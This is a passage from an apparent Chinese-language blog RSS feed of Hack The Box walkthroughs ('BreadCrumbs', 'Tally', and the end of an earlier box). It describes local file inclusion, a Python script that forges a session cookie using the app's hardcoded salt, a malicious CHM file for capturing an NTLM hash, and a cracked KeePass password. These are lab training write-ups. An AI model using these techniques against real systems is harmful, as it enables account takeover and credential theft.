&lt;p&gt;其实这里的意思是，让我们做一个帮助文档，然后会有人查看这个文档，结合downloads里面的chm文档，上面应该放置的就是这个文档，我们需要利用chm做一个payload：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb7cca88758e4558e97a83032bc41616aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后续使用htmlhelp.exe来进行制作，然后就可以获取到administrator的ntlmhash进行破解即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70e8271e92b629901057130b90db7884image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X036 BreadCrumbs</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70be77fb5ef93b8149102fb00a072d05image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8715c473c00666e0051e4bfffdde548image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE29b677e2297d8725770835b3ff84dbf4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf06af7d090a1110fa2f7e891703eac51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得注意的服务：ssh\http\smb\mysql&lt;/p&gt;
&lt;p&gt;smb：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE577cd4ade8a9a13d84ae8618db0b8d31image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;http:&lt;/p&gt;
&lt;p&gt;看起来是个搜索框，可能是sql注入？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc5ccae5df7ad67cbdbab90c92ab5d5c9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;fuzz好像没有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc4a1d68693754c002aed4f20f59380eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;目录扫描，发现登录框：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88a7af724c1f43258f48b344870d803cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现很多用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE611c4eb350390e4fbe8373abe6846b4cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;似乎是存放cookie的地方：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE79915e476c56fdc93a82e5f7e8c588b7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时发现，疑似文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb358716131321cf3f726119aac887f51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;根据报错，看样子是有了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4c50303b32179b578469e85d451c9bffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功读取cookie.php:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7bd0675c4fd79d436654812ca19e2971image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看login.php的源码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe2d9dc38b25f889b59062562bab56330image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;似乎authController.php才是负责身份控制的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE378001e303caa274ed5fed50c7783e12image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现数据文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2903756de18100cc7ab83d37d08408bdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2858bb6f9846a0f08a70ca842e07602dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不允许登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75f311313cc9cf369f8e48733673959bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4122ba0229a6bb89cb50f80c35c0c010image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读取它：&lt;/p&gt;
&lt;p&gt;简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d23778e62cf8f06a5217cbe1a974503image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：&lt;/p&gt;
&lt;p&gt;这里面只需要提供账号名，我们就可以伪造了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE910293850c731e21055e0e151283ddb6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE17b9646a16d87a4a2c5ca7a89b2a938fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import hashlib
import random

def makesession(username):
    max_index = len(username) - 1
    seed = random.randint(0, max_index)
    key = &amp;#34;s4lTy_stR1nG_&amp;#34; + username[seed] + &amp;#34;(!528./9890&amp;#34;
    session_cookie = username + hashlib.md5(key.encode()).hexdigest()

    return session_cookie

# 测试示例
username = &amp;#34;paul&amp;#34;
session_cookie = makesession(username)
print(&amp;#34;Generated Session Cookie:&amp;#34;, session_cookie)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7b9afb35c9b08cf526a1edc1e62bc361image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X038 Tally</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x038-tally/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x038-tally/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2e65f32af6430600375a0f308e85fe70image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5bc4aae6d24dbfb004aca4c9548c9cecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1e113e5e44899274a4b48480d7e76007image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5e37c1a6db88c53a1ace675970cd5b08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：&lt;/p&gt;
&lt;p&gt;ftp、http、smb、mysql、winrm&lt;/p&gt;
&lt;p&gt;先看ftp:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ed7e599ecd0488c2e86079a77b99131image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fe345e31db3bdb7cf273e07915c3984image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能看看http了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE090ee03356170ef55f38ba11bf7f2564image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我扫了半天也没扫出东西来，看了才知道，得用其他字典:&lt;/p&gt;
&lt;p&gt;/usr/share/wordlists/dirb/vulns/sharepoint.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0bfc009a4a3d09250fd72083120869aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这三个都可以用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7824a383e5e426d8266d5dada79e45dfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEef34adcded028c6e4b5c310e3a0ffdcdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现文档：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEae376517451fc4c05164c1bc4e7ac35dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有密码了，但是好像没名字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEee5a5b5cb2e5518d45cbd75613e68974image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先试试，但是失败了，继续信息收集，通过删除#号前面的内容，可以成功看到信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE541055b77ce347ec03309eb5d4f714a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名为：ftp_user，同时告诉我们一个信息，他们会定时查看htlm文件，在Intranet文件夹中，可能可以钓鱼：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6a08df7416a01876c4308183d3470cdbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE810f2e4a66c0c88cdad0af2af768b61bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf02fd893f94e0bf1dcac3f93def99a68image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;继续信息收集，发现一个keepass软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1c41a58845ab8cd87721b31604d23358image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个软件好像是个密码保存软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb74cb4f7fe8e5557ee0657c8fcaba253image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;并且查询后发现存储的密码是可以破解的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8949ce1edca07994e3f46dcd4b958945image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;simplementeyo    (tim)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE41302bbc7352a378dbb7059f2d716cf1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过keepass2读取文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd79827b229c7ced20ad4c600e0997da0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败了，但是成功登录了smb，说实话，东西太多了，这样增加的难度我不是很喜欢：&lt;/p&gt;
&lt;p&gt;在zz_Archived中发现密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe5939a893170acd30b2cbc81bfbb434cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像不对：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe7195889aad737dab014b521ce28e36cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
